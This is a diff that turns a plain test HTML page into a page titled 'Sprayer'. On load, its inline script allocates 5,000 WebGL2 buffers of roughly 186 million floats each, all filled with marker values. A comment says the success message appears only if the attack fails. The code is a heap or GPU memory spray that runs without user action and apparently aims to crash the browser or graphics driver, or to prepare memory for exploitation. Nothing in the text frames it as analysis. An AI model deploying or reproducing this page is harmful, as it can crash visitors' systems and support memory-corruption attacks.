@@ -1,17 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>TEST</title>
-</head>
+<html>
+<head><title>Sprayer</title></head>
 <body>
-  <h2>Click the link below:</h2>
-  <a href="#" id="jsLink">Click me</a>
+  <h3>Sprayer</h3>
+  <script>
+    
+    const canvas = document.createElement("canvas");
+    canvas.width = 10;
+    canvas.height = 10;
+    document.body.appendChild(canvas);
+    const gl = canvas.getContext("webgl2", {failIfMajorPerformanceCaveat: false});
 
-  <noscript>
-    <p style="color: red;">JavaScript is disabled. This link won't work without it.</p>
-  </noscript>
+    const SPRAY_COUNT = 5000;    
+    const BUFSIZE = 0xB16B00B;  
+    const buffers = [];
 
-  <script src="link-handler.js"></script>
+    async function sprayBuffersChunked() {
+      for (let i = 0; i < SPRAY_COUNT; i++) {
+        const marker = 0xDAB00B5 + i;
+        const arr = new Float32Array(BUFSIZE).fill(marker);
+        const buf = gl.createBuffer();
+        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+        gl.bufferData(gl.ARRAY_BUFFER, arr, gl.STATIC_DRAW);
+        buffers.push({marker, buf});
+
+        if (i % 10 === 0) {
+          await new Promise(r => setTimeout(r, 10));
+        }
+      }
+      console.log(`Sprayed ${SPRAY_COUNT} buffers of size ${BUFSIZE} floats.`); // Only logs if it DOESN'T work.
+    }
+
+    sprayBuffersChunked();
+  </script>
 </body>
 </html>
